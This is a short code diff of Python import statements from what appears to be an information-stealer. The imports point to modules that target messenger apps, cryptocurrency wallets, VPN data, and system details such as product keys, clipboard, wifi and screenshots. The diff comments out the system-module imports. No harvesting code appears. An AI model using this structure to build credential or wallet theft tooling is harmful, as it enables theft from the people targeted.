@@ -13,11 +13,11 @@ from targets.messengers.telegram import Telegram
 from targets.messengers.viber import Viber
 from targets.messengers.skype import Skype
 from targets.messengers.pidgin import Pidgin
-from targets.system.system_info import SystemInfo
-from targets.system.productkey import ProductKey
-from targets.system.clipboard import ClipBoard
-from targets.system.wifi import Wifi
-from targets.system.programs import Programs
-from targets.system.photos import Screenshot
+# from targets.system.system_info import SystemInfo
+# from targets.system.productkey import ProductKey
+# from targets.system.clipboard import ClipBoard
+# from targets.system.wifi import Wifi
+# from targets.system.programs import Programs
+# from targets.system.photos import Screenshot
 from targets.wallets.wallets import Wallets
 from targets.vpn.vpn import VPN
